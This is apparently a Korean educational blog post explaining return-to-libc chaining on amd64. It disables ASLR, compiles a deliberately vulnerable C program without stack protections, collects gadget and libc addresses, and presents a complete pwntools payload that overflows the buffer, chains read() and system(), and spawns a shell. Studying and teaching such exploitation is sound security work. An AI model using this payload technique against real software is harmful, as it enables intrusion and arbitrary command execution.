---
title: "[PWNABLE] RTL_Chaining"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ RTL_Chaining은 RTL 기법을 응용하여 Chain 형태를 구성하여 수행하는 공격 기법이다. 체인을 구성한다라는 것이 무슨 말인지 아직은 잘 이해가 되지 않을 것인데, 이 다음에 다룰 ROP에서도 매우 중요하게 사용되기 때문에 이해하고 넘어가"
date: "2023-11-08"
translation_key: "tistory-98a777c41cfe"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-RTLChaining"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

RTL\_Chaining은 RTL 기법을 응용하여 Chain 형태를 구성하여 수행하는 공격 기법이다.

체인을 구성한다라는 것이 무슨 말인지 아직은 잘 이해가 되지 않을 것인데, 

이 다음에 다룰 ROP에서도 매우 중요하게 사용되기 때문에 이해하고 넘어가야 한다.

RTL에서도 다뤘듯이 가젯이 필요하다.

64비트 환경에서 실습을 진행할 것이기 때문에

System V 호출규약에 사용되는 6가지 레지스터(rdi, rsi, rdx ,rcx, r8, r9)를 고려하여 찾아야 한다.

먼저, ASLR을 우회하는 기법이 아니기 때문에 해당 보호기법을 해제하겠다.

```
sudo sysctl -w kernel.randomize_va_space=0
```

![](/assets/images/tistory/tistory-98a777c41cfe/001.png)

예제 코드는 다음과 같다.

```
#include <stdio.h>

void provide_gadget() {
    __asm__ ("pop %r9");
    __asm__ ("pop %r8");
    __asm__ ("pop %rcx");
    __asm__ ("pop %rdx");
    __asm__ ("pop %rsi");
    __asm__ ("pop %rdi");
    __asm__ ("ret");
    __asm__ ("pop %rax");
    __asm__ ("ret");
    __asm__ ("pop %rbx");
    __asm__ ("ret");
    __asm__ ("mov %rbx, (%rax)");
    __asm__ ("ret");
    __asm__ ("mov %rax, (%rbx)");
    __asm__ ("ret");
}

int main(void)
{
    char buf[256];
    read(0,buf,512);
    printf("%s",buf);
}
```

많이 본 코드 형태일 것이다.

이제는 보면 알겠지만 bof 취약점이 존재한다.

위 예제를 보면 system함수가 존재하지 않기 때문에 어떻게 셸을 실행시켜야할지 막막할 것이다.

```
gcc -no-pie -mpreferred-stack-boundary=4 -fno-stack-protector -fno-pie -o ex ex.c
```

보호기법을 해제하여 컴파일을 진행했다.

![](/assets/images/tistory/tistory-98a777c41cfe/002.png)

당연하겠지만 system, execve함수의 경우 심볼이 로드되지 않았다고 뜬다.

![](/assets/images/tistory/tistory-98a777c41cfe/003.png)

만약 이 바이너리 파일이 실행이 된다면 어떨까?

![](/assets/images/tistory/tistory-98a777c41cfe/004.png)

라이브러리 파일이 로드되면서 해당 함수들에 대한 주소를 가지게 되었다.

이 점을 이용하여 공격을 수행해야 한다.

이때 해당 주소들이 불변이라고 단정할 수 있을까??

정답은 당연히 ASLR을 꺼두었기 때문에 불변이다.

만약 ASLR이 켜져있는 상태 즉 주소들이 가변이라고 하면 ROP라는 공격을 수행해야 한다.

![](/assets/images/tistory/tistory-98a777c41cfe/005.png)

vmmap을 이용하여 메모리 값들을 확인하는 과정이다.

libc\_base의 주소가 0x00007ffff7d7f000인 것을 볼 수 있다.

![](/assets/images/tistory/tistory-98a777c41cfe/006.png)

이제 system 주소와 차이를 계산하면 0x50d70이라는 값이 나온다.

이제 참조하는 라이브러리 파일에서 확인해보겠다.

![](/assets/images/tistory/tistory-98a777c41cfe/007.png)

libc파일은 libc.so.6이므로 절대경로인 /lib/x86\_64-linux-gnu/libc.so.6을 확인해주면 된다.

![](/assets/images/tistory/tistory-98a777c41cfe/008.png)

system의 offset이 예제를 컴파일한 바이너리 파일에서 구한 값과 같은 것을 알 수 있다.

즉, 각 함수는 라이브러리 파일이 참조될때 정보를 읽을 수 있게된다.

* * *

이제 공격 실습을 해보겠다.

마침 pie도 꺼져있기 때문에 함수들의 plt, got 주소도 편하게 구할 수 있다.

공격방법에는 여러가지가 있겠지만 bss에 대해 이해도 할겸

read함수를 이용하여 /bin/sh를 입력하는 방법을 수행하겠다.

여기서 우리가 구해야 할 주소들은 다음과 같다.

1\. read, system 주소 구하기 - 함수 실행

2\. pppr, pr 가젯 구하기 - 체인 구성

3\. bss 세그먼트 주소 구하기 - /bin/sh 문자열

먼저 시나리오를 설명하면

1\. read함수를 사용하여 bss에 '/bin/sh\\x00'을 입력한다

2\. pop rdi; ret;가젯을 이용하여 system 함수를 실행한다.

2가지 단계만 거치면 되므로 매우 간단하다.

먼저 버퍼의 크기를 확인해보면 0x100인 것을 알 수 있다.

![](/assets/images/tistory/tistory-98a777c41cfe/009.png)

이제 필요한 준비물들을 구해보겠다.

read함수의 주소 구하기 - plt

![](/assets/images/tistory/tistory-98a777c41cfe/010.png)

가젯 구하기 - rdi, rsi 가젯

![](/assets/images/tistory/tistory-98a777c41cfe/011.png)

bss 주소 찾기

![](/assets/images/tistory/tistory-98a777c41cfe/012.png)

system 주소 찾기

![](/assets/images/tistory/tistory-98a777c41cfe/013.png)

구한 값들을 정리하면 다음과 같다.

p\_rdi = 0x0000000000401165

p\_rdi\_rsi\_rdx = 0x0000000000401163

read@plt = 0x0000000000401060

system@add = 0x7ffff7dcfd70

bss = 0000000000404038

이제 페이로드를 작성해보겠다.

```
from pwn import*

p = process('./ex')

p_rdi = 0x0000000000401165
p_rdi_rsi_rdx = 0x0000000000401163
read_plt = 0x0000000000401060
system_add = 0x7ffff7dcfd70
bss = 0x0000000404038

payload = b'A'*0x100
payload += b'B'*0x8
```

여기까지는 이전 공격기법들과 동일하다.

이제 체인을 구성해볼 것인데 각각 read와 system 함수를 실행하는 체인이다.

read함수부터 살펴보면 인자를 3개 필요로 한다.

때문에 3개의 레지스터 rdi, rsi, rdx를 이용하기 때문에 해당 가젯들을 필요로 한다.

system 함수의 경우는 인자를 1개만 필요로 하기 때문에 rdi 가젯을 사용하면 된다.

우리가 구현할 코드는 다음과 같다.

```
read(0,bss,8);
system(bss);
```

마침 가젯에서 우리는 rdi, rsi, rdx를 모두 변조하는 가젯들을 구해냈다.

이제 체인을 구성하면 된다.

p\_rdi\_rsi\_rdx

0

bss

8

read@plt

이 형태가 첫번째 체인이 된다.

이어서 두번째 체인이다.

p\_rdi

bss

system@add

체인을 모두 구성했으면 페이로드를 완성해보겠다.

```
from pwn import*

p = process('./ex')

p_rdi = 0x0000000000401165
p_rdi_rsi_rdx = 0x0000000000401163
read_plt = 0x0000000000401060
system_add = 0x7ffff7dcfd70
bss = 0x0000000404038

payload = b'A'*0x100
payload += b'B'*0x8

#Chain1 - input /bin/sha
payload += p64(p_rdi_rsi_rdx)
payload += p64(0x8)
payload += p64(bss)
payload += p64(0x0)
payload += p64(read_plt)

#Chain2 - get shell
payload += p64(p_rdi)
payload += p64(bss)
payload += p64(system_add)

p.send(payload)

p.send(b'/bin/sh\x00')

p.interactive()
```

실행을 하면 정상적으로 셸을 얻을 수 있다.

![](/assets/images/tistory/tistory-98a777c41cfe/014.png)
